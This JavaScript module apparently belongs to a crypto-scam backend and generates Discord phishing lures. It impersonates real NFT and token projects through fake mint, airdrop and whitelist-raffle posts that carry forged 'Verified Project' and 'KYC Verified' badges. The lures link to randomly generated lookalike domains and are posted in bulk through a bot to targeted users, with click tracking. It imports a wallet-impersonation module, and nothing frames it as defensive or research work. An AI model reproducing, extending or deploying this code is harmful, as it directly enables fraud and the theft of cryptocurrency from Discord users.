// backend/modules/discordLureGenerator.js
import { REST, Routes } from 'discord.js';
import { DISCORD_BOT_TOKEN, DISCORD_APPLICATION_ID } from '../config.js';
import { securityManager } from './securityManager.js';
import { walletImpersonator } from './walletImpersonator.js';

export class DiscordLureGenerator {
    constructor() {
        this.rest = new REST({ version: '10' }).setToken(DISCORD_BOT_TOKEN);
        this.activeLures = new Map();
        this.guildTemplates = new Map();
        this.isInitialized = false; // ← ADD THIS
        
        this.nftProjects = [
            {
                name: "Bored Ape Yacht Club",
                floor: "45.2 ETH",
                holders: "6500",
                twitter: "BoredApeYC"
            },
            {
                name: "CryptoPunks",
                floor: "62.8 ETH", 
                holders: "3500",
                twitter: "cryptopunksnfts"
            },
            {
                name: "Azuki",
                floor: "12.5 ETH",
                holders: "8900",
                twitter: "Azuki"
            },
            {
                name: "Moonbirds",
                floor: "8.7 ETH",
                holders: "7200",
                twitter: "moonbirds"
            }
        ];

        this.tokenProjects = [
            {
                name: "Shiba Inu",
                symbol: "SHIB",
                price: "$0.000012",
                change: "+8.2%"
            },
            {
                name: "Pepe",
                symbol: "PEPE", 
                price: "$0.0000015",
                change: "+23.7%"
            },
            {
                name: "Dogecoin",
                symbol: "DOGE",
                price: "$0.15",
                change: "+5.8%"
            },
            {
                name: "Safemoon",
                symbol: "SAFEMOON",
                price: "$0.00000032",
                change: "+15.3%"
            }
        ];

        this.raffleTemplates = [
            "WL Spot Giveaway! 🎫",
            "Free Mint Pass 🎨",
            "Airdrop Entry 📦",
            "Premium Whitelist 🏆",
            "OG Role Raffle 🔥"
        ];
    }

    // ← ADD THIS METHOD
    async initialize() {
        if (this.isInitialized) return true;
        try {
            console.log(`🔄 Initializing ${this.constructor.name}...`);
            
            // Initialize Discord bot connection
            if (!DISCORD_BOT_TOKEN || !DISCORD_APPLICATION_ID) {
                console.warn('⚠️ Discord credentials missing - lures will be generated but not posted');
                this.isInitialized = true;
                return true;
            }

            const data = await this.rest.get(Routes.user());
            console.log(`✅ Discord bot connected as ${data.username}`);
            
            // Start cleanup interval
            this.cleanupInterval = setInterval(() => {
                this.cleanupOldLures();
            }, 60 * 60 * 1000);

            this.isInitialized = true;
            console.log(`✅ ${this.constructor.name} initialized`);
            return true;
        } catch (error) {
            console.warn(`⚠️ ${this.constructor.name} initialization failed:`, error.message);
            this.isInitialized = true; // Still mark as initialized but with limited functionality
            return true;
        }
    }

    // Generate a fake NFT mint lure
    async generateNFTMintLure(targetUser = null, projectData = null) {
        const project = projectData || this.getRandomNFTProject();
        const lureId = `nft_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        
        const lure = {
            id: lureId,
            type: 'nft_mint',
            project: project,
            timestamp: Date.now(),
            targetUser: targetUser,
            status: 'pending',
            engagement: 0,
            clicks: 0
        };

        // Generate fake mint website URL
        lure.mintUrl = this.generateFakeMintUrl(project.name);
        
        // Generate Discord message content
        lure.message = this.createNFTMintMessage(project, lure.mintUrl);
        
        // Generate embed for rich appearance
        lure.embed = this.createNFTEmbed(project);
        
        // Store the lure
        this.activeLures.set(lureId, lure);
        await securityManager.storeLure(lureId, lure);

        console.log(`🎨 Generated NFT mint lure: ${project.name}`);
        return lure;
    }

    // Generate a fake token launch lure
    async generateTokenLaunchLure(targetUser = null, tokenData = null) {
        const token = tokenData || this.getRandomTokenProject();
        const lureId = `token_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        
        const lure = {
            id: lureId,
            type: 'token_launch',
            token: token,
            timestamp: Date.now(),
            targetUser: targetUser,
            status: 'pending',
            engagement: 0,
            clicks: 0
        };

        // Generate fake token website URL
        lure.claimUrl = this.generateFakeClaimUrl(token.symbol);
        
        // Generate Discord message
        lure.message = this.createTokenLaunchMessage(token, lure.claimUrl);
        
        // Generate embed
        lure.embed = this.createTokenEmbed(token);
        
        this.activeLures.set(lureId, lure);
        await securityManager.storeLure(lureId, lure);

        console.log(`💰 Generated token launch lure: ${token.name}`);
        return lure;
    }

    // Generate a fake raffle/whitelist lure
    async generateRaffleLure(targetUser = null) {
        const raffleType = this.raffleTemplates[Math.floor(Math.random() * this.raffleTemplates.length)];
        const lureId = `raffle_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        
        const lure = {
            id: lureId,
            type: 'raffle',
            raffleType: raffleType,
            timestamp: Date.now(),
            targetUser: targetUser,
            status: 'pending',
            engagement: 0,
            clicks: 0,
            participants: 0,
            winners: Math.floor(Math.random() * 10) + 1
        };

        lure.entryUrl = this.generateFakeRaffleUrl(raffleType);
        lure.message = this.createRaffleMessage(raffleType, lure.entryUrl);
        lure.embed = this.createRaffleEmbed(raffleType);
        
        this.activeLures.set(lureId, lure);
        await securityManager.storeLure(lureId, lure);

        console.log(`🎫 Generated raffle lure: ${raffleType}`);
        return lure;
    }

    // Post lure to Discord channel
    async postLureToDiscord(lureId, channelId) {
        try {
            const lure = this.activeLures.get(lureId);
            if (!lure) {
                throw new Error('Lure not found');
            }

            if (!DISCORD_BOT_TOKEN) {
                console.warn('⚠️ Discord bot token missing - lure not posted');
                lure.status = 'failed';
                return lure;
            }

            const messageData = {
                content: lure.message,
                embeds: [lure.embed],
                components: [this.createActionRow(lure)]
            };

            await this.rest.post(Routes.channelMessages(channelId), {
                body: messageData
            });

            lure.status = 'posted';
            lure.postedAt = Date.now();
            lure.channelId = channelId;
            
            console.log(`📤 Posted lure to Discord: ${lureId}`);
            return lure;

        } catch (error) {
            console.error('❌ Failed to post lure to Discord:', error.message);
            const lure = this.activeLures.get(lureId);
            if (lure) {
                lure.status = 'failed';
                lure.error = error.message;
            }
            throw error;
        }
    }

    // Create multiple lures for different projects
    async generateLureCampaign(targetUsers, lureTypes = ['nft_mint', 'token_launch', 'raffle']) {
        const campaignId = `campaign_${Date.now()}`;
        const results = {
            id: campaignId,
            generated: 0,
            posted: 0,
            failed: 0,
            lures: []
        };

        for (const targetUser of targetUsers) {
            for (const lureType of lureTypes) {
                try {
                    let lure;
                    switch (lureType) {
                        case 'nft_mint':
                            lure = await this.generateNFTMintLure(targetUser);
                            break;
                        case 'token_launch':
                            lure = await this.generateTokenLaunchLure(targetUser);
                            break;
                        case 'raffle':
                            lure = await this.generateRaffleLure(targetUser);
                            break;
                    }
                    
                    results.lures.push(lure);
                    results.generated++;
                    
                    // Small delay between lures
                    await new Promise(resolve => setTimeout(resolve, 500));
                    
                } catch (error) {
                    console.error(`❌ Failed to generate ${lureType} lure:`, error);
                    results.failed++;
                }
            }
        }

        console.log(`🎯 Generated campaign ${campaignId}: ${results.generated} lures`);
        return results;
    }

    // Track lure engagement (simulated)
    async trackLureEngagement(lureId, action = 'click') {
        const lure = this.activeLures.get(lureId);
        if (lure) {
            lure.clicks++;
            if (action === 'engage') lure.engagement++;
            
            lure.lastActivity = Date.now();
            this.activeLures.set(lureId, lure);
            
            console.log(`📊 Lure ${lureId} engagement: ${lure.clicks} clicks`);
            return lure;
        }
        return null;
    }

    // Message creation methods
    createNFTMintMessage(project, mintUrl) {
        const messages = [
            `🚀 **${project.name} MINT IS LIVE!** 🚀\nGet your exclusive NFT now! Floor at ${project.floor} 👇\n${mintUrl}`,
            `🎨 **${project.name} WHITELIST MINT** 🎨\nLimited spots available! Don't miss out! 👇\n${mintUrl}`,
            `🔥 **${project.name} PREMIUM MINT** 🔥\nOnly for early supporters! Grab yours! 👇\n${mintUrl}`
        ];
        return messages[Math.floor(Math.random() * messages.length)];
    }

    createTokenLaunchMessage(token, claimUrl) {
        const messages = [
            `💎 **${token.name} ($${token.symbol}) LAUNCH!** 💎\nUp ${token.change} today! Claim airdrop 👇\n${claimUrl}`,
            `🚀 **$${token.symbol} TOKEN LAUNCH** 🚀\nMassive pump incoming! Get in early 👇\n${claimUrl}`,
            `🎯 **${token.name} AIRDROP LIVE** 🎯\nFree tokens for early participants! 👇\n${claimUrl}`
        ];
        return messages[Math.floor(Math.random() * messages.length)];
    }

    createRaffleMessage(raffleType, entryUrl) {
        const messages = [
            `🎫 **${raffleType}** 🎫\nLimited entries! Join now for your chance! 👇\n${entryUrl}`,
            `🏆 **${raffleType}** 🏆\nExclusive opportunity! Enter below 👇\n${entryUrl}`,
            `🔥 **${raffleType}** 🔥\nDon't miss this rare chance! Enter here 👇\n${entryUrl}`
        ];
        return messages[Math.floor(Math.random() * messages.length)];
    }

    // Embed creation methods
    createNFTEmbed(project) {
        return {
            title: `🎨 ${project.name} Mint`,
            description: `Floor Price: ${project.floor}\nHolders: ${project.holders}\nTwitter: @${project.twitter}`,
            color: 0x00ff00,
            thumbnail: { url: this.generateFakeImageUrl('nft') },
            fields: [
                { name: '🚀 Mint Status', value: 'LIVE', inline: true },
                { name: '⏰ Time Left', value: '2 hours', inline: true },
                { name: '🎫 Supply', value: '10,000', inline: true }
            ],
            footer: { text: 'Official Partner • Verified Project' },
            timestamp: new Date().toISOString()
        };
    }

    createTokenEmbed(token) {
        return {
            title: `💎 ${token.name} (${token.symbol})`,
            description: `Price: ${token.price}\n24h Change: ${token.change}\nMarket Cap: $${this.randomMarketCap()}M`,
            color: 0xff9900,
            thumbnail: { url: this.generateFakeImageUrl('token') },
            fields: [
                { name: '📈 Status', value: 'TRENDING', inline: true },
                { name: '🔄 Liquidity', value: '$2.5M', inline: true },
                { name: '👥 Holders', value: '1,250', inline: true }
            ],
            footer: { text: 'Audited • KYC Verified' },
            timestamp: new Date().toISOString()
        };
    }

    createRaffleEmbed(raffleType) {
        return {
            title: `🎯 ${raffleType}`,
            description: 'Exclusive opportunity for community members!',
            color: 0x0099ff,
            thumbnail: { url: this.generateFakeImageUrl('raffle') },
            fields: [
                { name: '🎫 Entries', value: '250/500', inline: true },
                { name: '⏰ Ends In', value: '3 hours', inline: true },
                { name: '🏆 Winners', value: '25 spots', inline: true }
            ],
            footer: { text: 'Official Community Event' },
            timestamp: new Date().toISOString()
        };
    }

    createActionRow(lure) {
        return {
            type: 1,
            components: [{
                type: 2,
                label: this.getButtonLabel(lure.type),
                style: 5, // LINK style
                url: lure.type === 'nft_mint' ? lure.mintUrl : 
                     lure.type === 'token_launch' ? lure.claimUrl : lure.entryUrl
            }]
        };
    }

    // Utility methods
    getRandomNFTProject() {
        return this.nftProjects[Math.floor(Math.random() * this.nftProjects.length)];
    }

    getRandomTokenProject() {
        return this.tokenProjects[Math.floor(Math.random() * this.tokenProjects.length)];
    }

    generateFakeMintUrl(projectName) {
        const slug = projectName.toLowerCase().replace(/\s+/g, '-');
        return `https://mint-${slug}-${Math.random().toString(36).substr(2, 8)}.xyz`;
    }

    generateFakeClaimUrl(tokenSymbol) {
        return `https://claim-${tokenSymbol.toLowerCase()}-${Math.random().toString(36).substr(2, 6)}.app`;
    }

    generateFakeRaffleUrl(raffleType) {
        const slug = raffleType.toLowerCase().replace(/[^a-z0-9]/g, '');
        return `https://raffle-${slug}-${Math.random().toString(36).substr(2, 8)}.io`;
    }

    generateFakeImageUrl(type) {
        const types = {
            nft: 'https://picsum.photos/200/200?random=1',
            token: 'https://picsum.photos/200/200?random=2', 
            raffle: 'https://picsum.photos/200/200?random=3'
        };
        return types[type] || types.nft;
    }

    randomMarketCap() {
        return (Math.random() * 500 + 10).toFixed(1);
    }

    getButtonLabel(lureType) {
        const labels = {
            nft_mint: '🚀 Mint Now',
            token_launch: '💎 Claim Airdrop',
            raffle: '🎫 Enter Raffle'
        };
        return labels[lureType] || '👉 Click Here';
    }

    // Clean up old lures
    cleanupOldLures(maxAgeHours = 24) {
        const now = Date.now();
        const maxAge = maxAgeHours * 60 * 60 * 1000;
        
        for (const [lureId, lure] of this.activeLures.entries()) {
            if (now - lure.timestamp > maxAge) {
                this.activeLures.delete(lureId);
                console.log(`🧹 Cleaned up old lure: ${lureId}`);
            }
        }
    }

    // Get lure statistics
    getLureStats() {
        const stats = {
            total: this.activeLures.size,
            byType: { nft_mint: 0, token_launch: 0, raffle: 0 },
            totalClicks: 0,
            totalEngagement: 0
        };

        for (const lure of this.activeLures.values()) {
            stats.byType[lure.type] = (stats.byType[lure.type] || 0) + 1;
            stats.totalClicks += lure.clicks;
            stats.totalEngagement += lure.engagement;
        }

        return stats;
    }
}

// Create singleton instance
export const discordLureGenerator = new DiscordLureGenerator();